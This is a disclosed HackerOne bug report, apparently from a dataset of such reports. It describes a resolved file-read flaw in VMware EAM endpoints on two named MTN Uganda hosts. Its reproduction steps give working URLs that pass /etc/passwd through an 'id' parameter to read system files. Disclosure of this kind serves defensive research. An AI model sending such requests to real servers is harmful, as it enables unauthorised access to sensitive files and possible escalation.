---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1069105'
original_report_id: '1069105'
title: 2x Remote file inclusion within your VMware Instances
weakness: Remote File Inclusion
team_handle: mtn_group
created_at: '2020-12-31T05:35:34.058Z'
disclosed_at: '2021-08-19T20:16:25.820Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
asset_identifier: mtn.co.ug
asset_type: URL
max_severity: critical
tags:
- hackerone
- remote-file-inclusion
---

# 2x Remote file inclusion within your VMware Instances

## Metadata

- HackerOne Report ID: 1069105
- Weakness: Remote File Inclusion
- Program: mtn_group
- Disclosed At: 2021-08-19T20:16:25.820Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
2x Remote file inclusion within your VMware Instances

##Hosts: 

nmc.vc.mtn.co.ug
h28a.n1.ips.mtn.co.ug

## Steps To Reproduce:
Navigate to the URLs given below, /etc/passwd will be displayed.

https://nmc.vc.mtn.co.ug/eam/vib?id=/etc/passwd
https://h28a.n1.ips.mtn.co.ug/eam/vib?id=/etc/passwd

## Impact

An attacker is able to view sensitive files on the server hosting this content and could potentially elevate this to a remote code execution.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
